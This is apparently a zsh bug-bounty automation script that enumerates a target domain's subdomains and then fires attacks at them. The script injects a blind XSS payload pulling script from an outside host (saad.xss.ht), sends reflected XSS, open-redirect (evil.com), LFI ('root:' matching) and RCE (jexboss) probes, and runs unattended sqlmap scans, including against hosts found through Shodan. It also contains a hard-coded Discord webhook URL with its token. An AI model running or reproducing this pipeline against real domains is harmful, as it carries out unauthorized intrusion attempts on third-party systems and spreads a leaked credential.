#!/bin/zsh

#TARGET=$1
#DIR=$2

echo -e "\e[31m
█▀▀ █░░ █▀ █▀▀ ▄▀█ ▀▀█ ▄▄ ▄█ ▄█ █▀█
██▄ █▄▄ ▄█ █▀░ █▀█ ░░█ ░░ ░█ ░█ █▄█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

[ -z "$1" ] && { printf "\n [+]Please Use recon example.com[+]\n";exit;}

#------------------------------------------------#
echo -e "Start Subfinder \n"
#------------------------------------------------#
subfinder -d $1 -t 1000 -o subfinder.txt
#------------------------------------------------#
echo -e "Start Findomain \n"
#------------------------------------------------#
findomain --quiet -t $1 -u findomain.txt
#------------------------------------------------#
crobat -s $1 $DEBUG_ERROR | anew -q crobat.txt
#------------------------------------------------#
echo -e "Start Sort \n"
#------------------------------------------------#
cat subfinder.txt crobat.txt findomain.txt|sort -u|tee Final-subs.txt
#------------------------------------------------#
echo -e "Start Httpx \n"
#------------------------------------------------#
cat Final-subs.txt|httpx -threads 1000 -o $1-alive-subs.txt
#------------------------------------------------#
echo -e "handle it \n"
rm Final-subs.txt subfinder.txt crobat.txt findomain.txt
#------------------------------------------------#
echo -e "[+]Finish All Subdomain Enum for $1 target *$(wc -l "Final-subs.txt")* for None-Alive Subdomains and *$(wc -l "$1-alive-subs.txt")* for alive subdomains  "|notify -discord -discord-webhook-url "https://discord.com/api/webhooks/806494192409903134/ac9LWdRIHGDYFdoWeha_c66KHjipQrb1o7nz-du7aHXBwLx3EBx2aFZLCinhz3LWzjuy"
#------------------------------------------------#
echo -e "[+] Start CRLFUZZ [+]"
#------------------------------------------------#
crlfuzz -l $1-alive-subs.txt -s -c 1000 |tee crlfuzz.txt
#------------------------------------------------#
echo -e "[+] Finish CRLFUZZ And Found *$(wc -l < crlfuzz.txt)*"
#------------------------------------------------#
nuclei -update-templates
#------------------------------------------------#
httpx -l $1-alive-subs.txt -path /sm/login/loginpagecontentgrabber.do -threads 500 -random-agent -x GET,POST,PUT -title -tech-detect -status-code  -follow-redirects -title -mc 500
#------------------------------------------------#
echo -e "\e[31m
▀▄▀ █▀ █▀
█░█ ▄█ ▄█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

echo -e "BLIND XSS \n"

gospider -s $1 -a -w -r -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace '&"><script src=https://saad.xss.ht></script>'

echo -e "WAYBACK \n"
mkdir $1
sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q $1/way_output.txt
#------------------------------------------------#
echo -e "REMOVE DUB \n"

cat $1/way_output.txt | urldedupe -s | anew -q $1/parameters.txt

echo -e "handle it \n"
rm $1/way_output.txt
#------------------------------------------------#
echo -e "REFLECTED XSS \n"
#------------------------------------------------#
cat $1/parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q $1/xssPatterns.txt
#------------------------------------------------#
cat $1/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/xss.txt &> /dev/null
#------------------------------------------------#
dalfox file $1/xssPatterns.txt pipe --no-color --no-spinner -w 300 -b saad.xss.ht 2> /dev/null | anew -q $1/xss.txt &> /dev/null

echo -e "BLINDER \n"

python3 Blinder.py -u saad -f $1-alive-subs.txt -r deny

echo -e "handle it \n"

rm $1/xssPatterns.txt

echo -e "\e[31m
█▀█ █▀█ █▀▀ █▄░█
█▄█ █▀▀ ██▄ █░▀█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

#------------------------------------------------#
echo -e "OPEN REDIRECT \n"
#------------------------------------------------#
cat $1/parameters.txt | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $1/redirectPatterns.txt
#------------------------------------------------#
cat $1/redirectPatterns.txt | qsreplace "FUZZ" | anew -q $1/checkRedirect.txt
#------------------------------------------------#
python3 OpenRedireX/openredirex.py -l $1/checkRedirect.txt --keyword FUZZ -p OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q $1/redirect.txt &> /dev/null

cat $1/checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/redirect.txt &> /dev/null

python3 Oralyzer/oralyzer.py -l $1/checkRedirect.txt -p Oralyzer/payloads.txt

echo -e "handle it \n"

rm $1/redirectPatterns.txt $1/checkRedirect.txt

echo -e "RCE \n"

python3 jexboss/jexboss.py -mode file-scan -file $1-alive-subs.txt

echo -e "LFI \n"

cat $1/parameters.txt | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $1/lfiPatterns.txt

cat $1/lfiPatterns.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/lfi.txt &> /dev/null

httpx -l $1/lfiPatterns.txt -paths lfi-payloads.txt -threads 1000 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"

echo -e "handle it \n"

rm $1/lfiPatterns.txt

echo -e "SQLI \n"

cat $1/parameters.txt | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $1/sqliPatterns.txt

sqlmap -m $1/sqliPatterns.txt --batch --random-agent --level 1 --threads=5

sqlmap -m $1-alive-subs.txt --batch --random-agent --level 1 --crawl=5 --forms --threads=5

python3 dirsearch/dirsearch.py -l $1-alive-subs.txt -i 200 -t 300 $1/dirsearch.txt

echo -e "SHODAN \n"

shodan search ssl:"$1"  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httpx -silent -threads 300 -o $1test

python3 dirsearch/dirsearch.py -l $1test -t 300 -o $1/dirsearch0.txt

sqlmap -m $1test --batch --random-agent --crawl=5 --forms --threads=5

echo -e "handle it \n"

rm $1test

echo -e "\e[31m
█▀▄ █▀█ █▄░█ █▀▀
█▄▀ █▄█ █░▀█ ██▄
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

echo -e "[+]Finish RECON for $1 "|notify -discord -discord-webhook-url "https://discord.com/api/webhooks/806494192409903134/ac9LWdRIHGDYFdoWeha_c66KHjipQrb1o7nz-du7aHXBwLx3EBx2aFZLCinhz3LWzjuy"
#------------------------------------------------#
